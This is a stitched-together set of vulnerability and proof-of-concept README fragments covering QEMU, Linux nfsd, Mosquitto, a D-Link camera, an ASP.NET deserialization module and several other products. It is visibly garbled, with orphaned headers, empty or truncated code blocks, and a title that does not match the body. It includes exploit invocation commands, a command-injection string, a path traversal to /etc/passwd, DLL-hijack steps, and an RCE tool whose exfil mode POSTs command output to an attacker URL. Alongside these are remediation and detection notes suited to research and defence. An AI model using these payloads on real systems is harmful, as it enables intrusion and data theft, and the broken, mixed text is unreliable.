# CVE-2026-126657 — QEMU NBD client: uninitialized host heap disclosed to the guest

[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Research status: validated](https://img.shields.io/badge/research-validated%20differential-success.svg)](#5-expected-results)

| | |
| --- | --- |
| **CVE** | CVE-2026-126657 |
| **Component** | QEMU — `block/nbd.c::nbd_co_receive_cmdread_reply` |
| **Affected** | QEMU versions before `470888f` |
| **Fixed in** | **`470888f`** (GHSA-8mcr-7pgx-3pvf) |
| **CWE** | CWE-908 (Use of Uninitialized Resource) |
| **Impact** | A malicious NBD server could mark a structured read reply as done while sending less data than requested. The client left the uncovered portion of the guest buffer at its malloc contents, which the guest could then read — disclosing host process heap memory across the virtualization boundary |
| **Vector** | guest connecting to a malicious NBD server |
| **Trigger** | a structured read reply containing only a one-byte hole for a 16-byte request |

The vulnerable behavior left skipped regions untouched:

```c
// block/nbd.c — pre-fix
// server sends fewer bytes than requested; qiov keeps its malloc contents
// (qemu-io poisons allocations with 0xab, making the leak reproducible)
```

The fix tracks covered data and zeroes the rest:

```c
// fixed (commit 470888f, verbatim logic in the lab)
uint64_t highwater = offset;
...
if (slice->offset > highwater) {
    qemu_iovec_memset(qiov, highwater - offset, 0, slice->offset - highwater);
}
highwater = MAX(highwater, slice->offset + slice->length);
...
if (iter.only_structured && iter.ret == 0 && highwater < offset + qiov->size) {
    qemu_iovec_memset(qiov, highwater - offset, 0, offset + qiov->size - highwater);
}
```

---

## 1. Root cause

The NBD client populated a guest-visible iovec directly from the chunks a server
sent. A non-compliant server could omit chunks and still mark the reply done;
those parts of the iovec were never written, so the guest read whatever was in
the host allocation. The fix records how far into the request the server's data
actually reached and zeroes every skipped or trailing region before returning.

## Description

A race condition in the Linux kernel's `nfsd` NFSv4.1 session handling allows concurrent `DESTROY_SESSION` RPC calls to trigger a use-after-free in `nfsd_destroy_session()`. An NFS client with network access can exploit this to cause kernel memory corruption, potentially achieving privilege escalation or reliable kernel crash (DoS).

## Attack Flow

```mermaid
flowchart TD
    A[Attacker NFS Client] -->|Thread 1: DESTROY_SESSION xid=A| B[nfsd_destroy_session]
    A -->|Thread 2: DESTROY_SESSION xid=B| B
    B -->|Race — session freed by T1| C{Use-after-free — CWE-416}
    C -->|Kernel memory corruption| D[PrivEsc or Kernel Panic / DoS]
```

```bash
# Requires NFS access to target server
python cve_2026_99310.py --host 192.168.1.10 --threads 32 --iterations 200
python cve_2026_99310.py --host 192.168.1.10 --verbose

```

```bash
# Update kernel
apt-get update && apt-get install linux-image-generic
# Or disable NFSv4 server if not needed
systemctl stop nfs-kernel-server && systemctl disable nfs-kernel-server
```

## Description

The `nx_import_template` AJAX action in Nexter Blocks Pro does not verify that the requesting user has sufficient capabilities before processing role and capability assignments. Any subscriber-level authenticated user can send a crafted POST to elevate their role to administrator.

## Attack Flow

```mermaid
sequenceDiagram
    participant Attacker as Subscriber-Level User
    participant WP as WordPress admin-ajax.php
    participant DB as User Database

    Attacker->>WP: POST action=nx_import_template, role=administrator
    WP->>WP: Missing capability_check — CWE-269
    WP->>DB: UPDATE user_meta SET wp_capabilities=administrator
    DB-->>WP: Success
    WP-->>Attacker: success:true — now admin
```

```

## Remediation

- Upgrade Nexter Blocks Pro to >= 4.1.2
- Add `current_user_can('manage_options')` check before processing `nx_import_template`
- Audit all AJAX actions in the plugin for missing capability checks

## Description

The `/cgi-bin/setconf.cgi` endpoint on D-Link DCS-935L cameras does not sanitize shell metacharacters in the `ReplyAddress` parameter. An unauthenticated attacker on the network can inject arbitrary OS commands that execute with the camera's privileged process context.

## Attack Flow

```mermaid
sequenceDiagram
    participant Attacker
    participant Camera as DCS-935L /cgi-bin/setconf.cgi
    participant Shell as Embedded Linux Shell

    Attacker->>Camera: GET setconf.cgi?ReplyAddress=x;id;&... (unauthenticated)
    Camera->>Shell: system("sendmail x;id; ...") — CWE-78
    Shell-->>Attacker: OOB or in-band command output (RCE)
```

## Description

Eclipse Mosquitto's `password_file` authentication performs a hash prefix comparison that is vulnerable to short-password bypass. When a supplied password generates a hash that shares a prefix with a stored hash entry, authentication is incorrectly granted. Empty or very short passwords can exploit this logic flaw to gain unauthorized access.

## Attack Flow

```mermaid
flowchart LR
    A[Attacker] -->|MQTT CONNECT user=admin pw=X| B[Mosquitto Auth]
    B -->|hash short pw| C{Prefix Match?}
    C -->|Yes — CWE-252| D[AUTH BYPASS — CONNACK RC=0]
    C -->|No| E[AUTH FAIL — CONNACK RC=4/5]
```

## PoC Usage

```bash
# Requires Mosquitto password_file authentication
python cve_2026_126708.py --host 127.0.0.1 --username admin --max-len 2
python cve_2026_126708.py --host broker.example.com --username testuser --max-len 3 --verbose
```

## Remediation

- Upgrade Eclipse Mosquitto to >= 2.0.20
- Regenerate all password file hashes after upgrade using `mosquitto_passwd`
- Enforce minimum password length policies in broker configuration

## Description

Eclipse Mosquitto supports the PROXY protocol to pass real client IP addresses through load balancers. When `use_proxy_protocol=true`, Mosquitto blindly trusts PROXY v2 headers on all incoming connections, allowing any client to claim an arbitrary source IP. IP-based ACLs are entirely bypassed.

## Attack Flow

```mermaid
sequenceDiagram
    participant Attacker
    participant Mosquitto as Mosquitto Broker
    participant ACL as IP-based ACL

    Attacker->>Mosquitto: TCP connect + PROXY v2 header (spoofed src=192.168.1.1)
    Mosquitto->>ACL: Check ACL for 192.168.1.1 (trusted IP)
    ACL-->>Mosquitto: Allow
    Mosquitto-->>Attacker: MQTT CONNACK — connected as trusted IP
```

## PoC Usage

```bash
# Requires Mosquitto with use_proxy_protocol=true
python cve_2026_129705.py --host 127.0.0.1 --port 1883 --spoof-ip 10.0.0.1
python cve_2026_129705.py --host broker.example.com --spoof-ip 192.168.1.1 --verbose
```

## Remediation

- Upgrade Eclipse Mosquitto to >= 2.0.20
- If PROXY protocol is not needed, set `use_proxy_protocol=false`
- Restrict PROXY protocol headers to trusted load balancer IPs via firewall

    BshServlet->>JVM: eval(script) — CWE-94
    JVM-->>Attacker: Command output (RCE)

## Description

The Mirasvit Cache Warmer extension for Magento 2 deserializes user-supplied data via a queue consumer endpoint without proper type validation. An authenticated attacker can supply a crafted PHP serialized gadget chain, achieving remote code execution on the host.

## Attack Flow

```mermaid
sequenceDiagram
    participant Attacker
    participant Magento_REST as Magento REST API
    participant CacheWarmer as Cache Warmer Consumer
    participant PHP as PHP Runtime

    Attacker->>Magento_REST: POST /rest/V1/mirasvit/cache-warmer/process (gadget chain payload)
    Magento_REST->>CacheWarmer: Dispatch queue job with jobData
    CacheWarmer->>PHP: unserialize(jobData) — CWE-502
    PHP-->>Attacker: OOB command execution (RCE)
```

# CVE-2026-131914: Idunno.AntiCsrf ObjectStateFormatter deserialization RCE

A detection and exploitation PoC for **CVE-2026-131914** (CVSS 4.0: 9.3, CWE-502), with a reproducible lab built on the **original vulnerable binary**.

> **Authorized use only.** Use this against systems you own or have written permission to test. There is no vendor fix: the project was abandoned in 2008. If you find this module in production, remove it.

## The bug
`Idunno.AntiCsrf` (≤ 0.9.1 Beta) is a 2008 ASP.NET WebForms `IHttpModule`. On every POST to a `System.Web.UI.Page`, in `PreRequestHandlerExecute`, it:
1. checks only that the CSRF cookie (`__CSRFCOOKIE`) and form field (`__CSRFTOKEN`) are non-empty;
2. calls `new ObjectStateFormatter().Deserialize(formField)`, which has **no MAC, no machineKey and no binder**;
3. *only then* compares the result with the cookie.

A single unauthenticated POST therefore reaches `BinaryFormatter` and runs code as the IIS app-pool identity. If `<csrfSettings>` is missing from `web.config`, a setter bug renames the form field to `RaiseException`.

Reference: Mandiant **MNDT-2026-0048** (<https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2026/MNDT-2026-0048.md>).

## Tool: `cve_2026_131914_anticsrf.py`
Python 3 using only the standard library. It **builds its own payloads**, so ysoserial.net isn't needed.

| Mode | What it does |
|---|---|
| `scan` | Discovery: follows redirect chains, keeps cookies, optionally crawls (`--crawl`) and tries common `.aspx` names (`--brute`). Fingerprints the module and auto-detects renamed cookies and fields. Then runs a **non-exploit differential probe** (matched / mismatched / BinaryFormatter-wrapped / malformed token vs a control field). Classifies `customErrors` and auth redirects. Writes JSON. |
| `exploit` | Builds a payload for **any command** and POSTs it under both field names. Takes targets from `-u` or `--from-scan`. |
| `gen` | Prints the base64 ObjectStateFormatter payload. |
| `listen` | Receives command output sent back by `--exfil`. |

Payload options:
- `-c CMD` runs through `cmd.exe /c`; add `--shell powershell` to use PowerShell instead.
- `--file`/`--args` passes a raw `Process.Start` filename and arguments.
- `--oob DOMAIN` sends a per-URL tagged DNS callback.
- `--exfil URL` POSTs the command's output to that URL.

Gadgets (`--gadget`):
- `TypeConfuseDelegate` (default): needs only mscorlib and System.
- `TextFormattingRunProperties`: needs `Microsoft.PowerShell.Editor` in the GAC.

Command execution is **blind and asynchronous**. Confirm it with `--oob` or `--exfil`.

```bash
python3 cve_2026_131914_anticsrf.py scan -u https://target/ --crawl --brute --proxy http://127.0.0.1:8080 -o scan.json
```
```bash
python3 cve_2026_131914_anticsrf.py exploit --from-scan scan.json --oob <id>.oastify.com
```
```bash
python3 cve_2026_131914_anticsrf.py exploit -u https://target/Login.aspx -c "whoami /all" --exfil http://<you>:8000/
```

## Detection (blue team)
- **Response fingerprint:** `Set-Cookie: __CSRFCOOKIE=<GUID>; HttpOnly`, plus a hidden `__CSRFTOKEN` field whose value starts with `/wEFJ` (an ObjectStateFormatter-serialized 36-character GUID).
- **On disk:** `Idunno.AntiCsrf.dll` in `bin/`; `Idunno.AntiCsrf.AntiCsrfModule` or `csrfSettings` in `web.config`. The official build's SHA-256 is `da1efcfed182597ee946a9ef2895dfdfeab2bdff16855aeef01656d8158ead06`.
- **Exploitation attempts:** POSTs to `.aspx` pages where `__CSRFTOKEN` or `RaiseException` starts with `/wEy` (`FF 01 32` = Token_BinarySerialized) and is unusually large (more than 1 KB). Typical responses are a 302 to the `customErrors` page or a 500. Look for `PotentialCsrfException`, `InvalidCastException` or `SerializationException` in the application logs, and for `w3wp.exe` spawning `cmd.exe` or `powershell.exe`.

## Lab
See [`lab/README.md`](lab/README.md). It covers an unattended Windows 11 ARM VM in UTM, IIS sites using the original `Idunno.AntiCsrf.dll` (hash-verified, provenance in [`lab/original/PROVENANCE.txt`](lab/original/PROVENANCE.txt)), a gadget self-test and the full scan → exploit → exfil chain.

## Description

NukeViet CMS allows SVG files to be uploaded via the media/file manager without stripping embedded JavaScript. When the uploaded SVG is accessed by a browser, the embedded `<script>` tag executes in the application's origin, enabling account takeover via cookie theft.

## Attack Flow

```mermaid
flowchart LR
    A[Attacker with File Upload Access] -->|Upload xss.svg with embedded script| B[NukeViet Media Manager]
    B -->|SVG stored with script intact| C[Web Server Uploads Directory]
    C -->|Victim opens SVG URL| D[JavaScript Executes in Browser]
    D --> E[Cookie Theft / Account Takeover]
```

```bash

```

## Remediation

- Sanitize SVG uploads using a library like SVG Sanitizer to strip `<script>` tags
- Serve user-uploaded SVGs with `Content-Disposition: attachment` to prevent inline execution
- Restrict SVG uploads to trusted administrators only
- Upgrade NukeViet CMS to a patched version

## Description

Google Dataform's workspace file read API does not canonicalize or restrict file paths before serving them. An authenticated GCP user with Dataform project access can traverse outside the repository root using `../` sequences to read arbitrary files in the workspace container environment.

## Attack Flow

```mermaid
flowchart LR
    A[Authenticated GCP User] -->|readFile with ../../../../etc/passwd| B[Dataform API]
    B -->|Path not canonicalized| C[Workspace Filesystem]
    C -->|Returns file contents| A
```

## PoC Usage

```bash
TOKEN=$(gcloud auth print-access-token)
python poc.py my-project us-central1 my-repo $TOKEN --file /etc/passwd
```

## Remediation

- Canonicalize and validate all file paths against the repository root
- Reject any path containing `../` or resolving outside the workspace directory
- Apply Google Dataform security patch

## Description

## Attack Flow

```mermaid

    B -->|Returns victim agent jobs| C[IDOR Confirmed]
    A -->|DELETE /pem/api/agent/2/job/1| D[Job Deleted from Foreign Agent]
```

## Description

EDB PEM's library/DLL loading mechanism includes user-writable directories in its search path before trusted system paths. A local attacker with write access to those directories can place a malicious shared library that gets loaded by PEM on startup, achieving privilege escalation to the PEM service account.

## Attack Flow

```mermaid
flowchart LR
    A[Local Low-Priv Attacker] -->|Write malicious libpq.dll to CWD/PATH| B[Writable Search Path Dir]
    B -->|PEM loads library on startup| C[Malicious DLL Executes]
    C --> D[Privilege Escalation to PEM Service Account]
```

## PoC Usage

```bash
python poc.py --pem-path "C:\Program Files\edb\pem" --hijack-lib libpq
```

## Remediation

- Use absolute paths for all library loads in PEM
- Remove CWD from DLL search order
- Upgrade EDB PEM to the patched version
- Restrict write access to PEM installation directories
